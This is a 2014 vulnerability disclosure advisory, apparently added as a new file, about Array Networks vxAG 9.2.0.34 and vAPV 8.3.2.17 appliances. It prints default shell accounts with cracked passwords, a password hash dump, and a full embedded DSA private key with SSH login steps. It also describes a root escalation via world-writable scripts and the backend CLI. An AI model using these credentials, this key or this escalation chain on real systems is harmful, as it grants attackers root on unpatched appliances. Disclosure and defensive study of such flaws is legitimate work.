@@ -1,0 +1,224 @@
+-----------
+Author:
+-----------
+
+xistence < xistence[at]0x90[.]nl >
+
+-------------------------
+Affected products:
+-------------------------
+
+Array Networks vxAG 9.2.0.34 and vAPV 8.3.2.17 appliances
+
+-------------------------
+Affected vendors:
+-------------------------
+
+Array Networks
+http://www.arraynetworks.com/
+
+-------------------------
+Product description:
+-------------------------
+
+vAPV:
+Virtual Application Delivery Controllers for Cloud and Virtualized
+Environments
+Powered by Array's award-winning 64-bit SpeedCore(tm) architecture, vAPV
+virtual application delivery controllers extend Array's
+proven price-performance and rich feature set to public and private clouds
+and virtualized datacenter environments.
+vAPV virtual application delivery controllers give enterprises and service
+providers the agility to offer on-demand
+load balancing services, dynamically allocate resources to maximize ROI on
+application infrastructure and develop and size
+new application environments using either private or public clouds.
+
+
+vxAG:
+Secure Access Gateways for Enterprise, Cloud & Mobile Environments
+Secure access gatewaysSecure access is undergoing dramatic change. With
+increasing mobility, growing adoption of cloud
+services and a shift in thinking that favors securing data over securing
+networks and devices, modern enterprises require
+a new breed of secure access solutions. Secure access gateways centralize
+control over access to business critical resources,
+providing security for data in motion and at rest and enforcing application
+level policies on a per user basis.
+
+The Array AG Series secure access gateway addresses challenges faced by
+enterprise, service provider and pubic-sector
+organizations in the areas of secure remote and mobile access to
+applications and cloud services. Available in a range of
+scalable, purpose-built appliances or as a virtual appliance for cloud and
+virtualized environments, the AG Series can
+support multiple communities of interest, connect users both in the office
+and on-the-go and provide access to traditional
+enterprise applications as well as services running in public and private
+clouds.
+
+
+----------
+Details:
+----------
+
+[ 0x01 - Default Users/Passwords ]
+
+The /etc/master.passwd file on the vxAG 9.2.0.34 and vAPV 8.3.2.17
+appliances contain default (unkown to the admin) shell users and passwords.
+
+$ cat /etc/master.passwd
+# $FreeBSD: src/etc/master.passwd,v 1.40 2005/06/06 20:19:56 brooks Exp $
+#
+root:$1$9QkJT4Y5$lF2BPaSI2kPlcrqz89yZv0:0:0::0:0:Charlie &:/root:/bin/csh
+toor:*:0:0::0:0:Bourne-again Superuser:/root:
+daemon:*:1:1::0:0:Owner of many system processes:/root:/usr/sbin/nologin
+operator:*:2:5::0:0:System &:/:/usr/sbin/nologin
+bin:*:3:7::0:0:Binaries Commands and Source:/:/usr/sbin/nologin
+tty:*:4:65533::0:0:Tty Sandbox:/:/usr/sbin/nologin
+kmem:*:5:65533::0:0:KMem Sandbox:/:/usr/sbin/nologin
+games:*:7:13::0:0:Games pseudo-user:/usr/games:/usr/sbin/nologin
+news:*:8:8::0:0:News Subsystem:/:/usr/sbin/nologin
+man:*:9:9::0:0:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
+sshd:*:22:22::0:0:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
+smmsp:*:25:25::0:0:Sendmail Submission
+User:/var/spool/clientmqueue:/usr/sbin/nologin
+mailnull:*:26:26::0:0:Sendmail Default
+User:/var/spool/mqueue:/usr/sbin/nologin
+bind:*:53:53::0:0:Bind Sandbox:/:/usr/sbin/nologin
+proxy:*:62:62::0:0:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
+_pflogd:*:64:64::0:0:pflogd privsep user:/var/empty:/usr/sbin/nologin
+_dhcp:*:65:65::0:0:dhcp programs:/var/empty:/usr/sbin/nologin
+uucp:*:66:66::0:0:UUCP
+pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
+pop:*:68:6::0:0:Post Office Owner:/nonexistent:/usr/sbin/nologin
+www:*:80:80::0:0:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
+nobody:*:65534:65534::0:0:Unprivileged user:/nonexistent:/usr/sbin/nologin
+test:$1$UtEw8DNY$te4MRasnXgETxWOZ9Z1o10:1002:1002::0:0:test:/export/test:/bin/tcsh
+sync:$1$bmfGRJPh$lWnesbn8M8xZNo3uaqfEd1:1005:0::0:0:sync:/export/sync:/bin/sh
+recovery::65533:0::0:0:Recovery User:/:/ca/bin/recovery
+mfg:$1$i8SV4bKc$lNMeb8Yow.p.cZvWxt1mO1:1013:1010::0:0:mfg:/export/mfg:/bin/tcsh
+arraydb:*:1015:0::0:0:User &:/home/arraydb:/bin/sh
+array::1016:1011::0:0:User &:/:/ca/bin/ca_shell
+
+Doing a quick password crack, the passwords for the mfg and sync are
+revealed:
+
+User: mfg Password: mfg
+User: sync Password: click1
+
+The passwords for "test" and "root" couldn't be cracked in a short time.
+
+
+Below an example of logging in with the user "sync" and password "click1"
+via SSH.
+
+$ ssh sync@192.168.2.55 /bin/sh
+sync@192.168.2.55's password:
+id
+uid=1005(sync) gid=0(wheel) groups=0(wheel)
+
+
+[ 0x02 - SSH Private Key ]
+
+The "sync" user also contains a private key in "~/.ssh/id_dsa":
+
+$ cat id_dsa
+-----BEGIN DSA PRIVATE KEY-----
+MIIBugIBAAKBgQCUw7F/vKJT2Xsq+fIPVxNC/Dyk+dN9DWQT5RO56eIQasd+h6Fm
+q1qtQrJ/DOe3VjfUrSm7NN5NoIGOrGCSuQFthFmq+9Lpt6WIykB4mau5iE5orbKM
+xTfyu8LtntoikYKrlMB+UrmKDidvZ+7oWiC14imT+Px/3Q7naj0UmOrSTwIVAO25
+Yf3SYNtTYv8yzaV+X9yNr/AfAoGADAcEh2bdsrDhwhXtVi1L3cFQx1KpN0B07JLr
+gJzJcDLUrwmlMUmrXR2obDGfVQh46EFMeo/k3IESw2zJUS58FJW+sKZ4noSwRZPq
+mpBnERKpLOTcWMxUyV8ETsz+9oz71YEMjmR1qvNYAopXf5Yy+4Zq3bgqmMMQyM+K
+O1PdlCkCgYBmhSl9CVPgVMv1xO8DAHVhM1huIIK8mNFrzMJz+JXzBx81ms1kWSeQ
+OC/nraaXFTBlqiQsvB8tzr4xZdbaI/QzVLKNAF5C8BJ4ScNlTIx1aZJwyMil8Nzb
++0YAsw5Ja+bEZZvEVlAYnd10qRWrPeEY1txLMmX3wDa+JvJL7fmuBgIUZoXsJnzs
++sqSEhA35Le2kC4Y1/A=
+-----END DSA PRIVATE KEY-----
+
+The following authorized keys file are there in the ~/.ssh directory:
+
+$ cat authorized_keys
+1024 35
+117781646131320088945310945996213112717535690524599971400605193647439008360689916421327587459429042579662784434303538942896683338584760112042194838342054595473085094045804963620754645364924583113650482968246287214031112796524662479539236259838315876244144983122361617319660444993650437402628793785173700484401
+sync@AN
+
+$ cat authorized_keys2
+ssh-dss
+AAAAB3NzaC1kc3MAAACBAJTDsX+8olPZeyr58g9XE0L8PKT5030NZBPlE7np4hBqx36HoWarWq1Csn8M57dWN9StKbs03k2ggY6sYJK5AW2EWar70um3pYjKQHiZq7mITmitsozFN/K7wu2e2iKRgquUwH5SuYoOJ29n7uhaILXiKZP4/H/dDudqPRSY6tJPAAAAFQDtuWH90mDbU2L/Ms2lfl/cja/wHwAAAIAMBwSHZt2ysOHCFe1WLUvdwVDHUqk3QHTskuuAnMlwMtSvCaUxSatdHahsMZ9VCHjoQUx6j+TcgRLDbMlRLnwUlb6wpniehLBFk+qakGcREqks5NxYzFTJXwROzP72jPvVgQyOZHWq81gCild/ljL7hmrduCqYwxDIz4o7U92UKQAAAIBmhSl9CVPgVMv1xO8DAHVhM1huIIK8mNFrzMJz+JXzBx81ms1kWSeQOC/nraaXFTBlqiQsvB8tzr4xZdbaI/QzVLKNAF5C8BJ4ScNlTIx1aZJwyMil8Nzb+0YAsw5Ja+bEZZvEVlAYnd10qRWrPeEY1txLMmX3wDa+JvJL7fmuBg==
+sync@AN
+
+This makes it possible to use the private key to login without a password.
+Do the following on a different system:
+
+Insert the id_dsa private key in a file called "synckey":
+
+cat > ~/synckey << EOF
+-----BEGIN DSA PRIVATE KEY-----
+MIIBugIBAAKBgQCUw7F/vKJT2Xsq+fIPVxNC/Dyk+dN9DWQT5RO56eIQasd+h6Fm
+q1qtQrJ/DOe3VjfUrSm7NN5NoIGOrGCSuQFthFmq+9Lpt6WIykB4mau5iE5orbKM
+xTfyu8LtntoikYKrlMB+UrmKDidvZ+7oWiC14imT+Px/3Q7naj0UmOrSTwIVAO25
+Yf3SYNtTYv8yzaV+X9yNr/AfAoGADAcEh2bdsrDhwhXtVi1L3cFQx1KpN0B07JLr
+gJzJcDLUrwmlMUmrXR2obDGfVQh46EFMeo/k3IESw2zJUS58FJW+sKZ4noSwRZPq
+mpBnERKpLOTcWMxUyV8ETsz+9oz71YEMjmR1qvNYAopXf5Yy+4Zq3bgqmMMQyM+K
+O1PdlCkCgYBmhSl9CVPgVMv1xO8DAHVhM1huIIK8mNFrzMJz+JXzBx81ms1kWSeQ
+OC/nraaXFTBlqiQsvB8tzr4xZdbaI/QzVLKNAF5C8BJ4ScNlTIx1aZJwyMil8Nzb
++0YAsw5Ja+bEZZvEVlAYnd10qRWrPeEY1txLMmX3wDa+JvJL7fmuBgIUZoXsJnzs
++sqSEhA35Le2kC4Y1/A=
+-----END DSA PRIVATE KEY-----
+EOF
+
+Change the rights of the file:
+
+chmod 600 ~/synckey
+
+SSH into the vxAG or vAPV appliance (change the IP below):
+
+ssh -i ~/synckey sync@192.168.2.55 /bin/sh
+
+Now you won't see a command prompt, but you can enter an "id" for example
+and you'll get:
+
+uid=1005(sync) gid=0(wheel) groups=0(wheel)
+
+
+[ 0x03 - Root Privilege Escalation ]
+
+The last issue is that the files "/ca/bin/monitor.sh" and
+"/ca/bin/debug_syn_stat" are world writable (chmod 777). Any user can write
+to these files.
+As the sync user it's possible to write to these files. If you write
+arbitrary commands to the monitor.sh script and then turn the debug
+monitoring off and on it will restart the script with root privileges.
+The sync user is able to run the /ca/bin/backend tool to execute CLI
+commands. Below how it's possible to turn the debug monitor off and on:
+
+Turn debug monitor off:
+/ca/bin/backend -c "debug monitor off"`echo -e "\0374"`
+
+Turn debug monitor on:
+/ca/bin/backend -c "debug monitor on"`echo -e "\0374"`
+
+Thus through combining the SSH private key issue and the world writable
+file + unrestricted backend tool it's possible to gain a remote root shell.
+
+
+-----------
+Solution:
+-----------
+
+Upgrade to newer versions
+
+Workaround: Change passwords and SSH key. Do a chmod 700 on the world
+writable file.
+
+--------------
+Timeline:
+--------------
+
+03-02-2014 - Issues discovered and vendor notified
+08-02-2014 - Vendor replies "Thank you very much for bringing this to our
+attention."
+12-02-2014 - Asked vendor for status updates and next steps.
+17-03-2014 - No replies, public disclosure
